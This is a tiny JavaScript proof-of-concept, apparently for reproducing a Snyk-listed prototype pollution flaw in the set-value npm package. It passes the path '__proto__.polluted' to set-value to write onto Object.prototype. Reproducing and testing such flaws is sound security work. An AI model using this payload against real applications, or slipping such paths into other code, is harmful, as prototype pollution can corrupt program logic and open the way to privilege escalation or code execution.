//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
 
  const setFn = require("set-value");
  const paths = ["__proto__.polluted"];

  var obj = {};

   

  setFn({}, paths[0], "yes");
// End of file
